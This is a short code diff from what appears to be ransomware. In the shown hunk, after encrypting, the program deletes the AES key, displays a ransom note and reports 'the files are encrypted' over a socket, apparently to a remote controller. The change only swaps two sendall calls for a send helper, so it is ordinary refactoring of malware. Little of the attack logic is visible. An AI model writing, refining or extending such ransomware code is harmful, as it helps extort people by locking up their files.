@@ -121,8 +121,7 @@ def main():
                     del aes_key
                     show_ransom_note_encryption()
                     
-                    secure_sock.sendall(b"the files are encrypted")
-                    secure_sock.sendall(b"__END__")
+                    send(secure_sock, "the files are encrypted")
                 
                 elif action == "decrypt":
                     
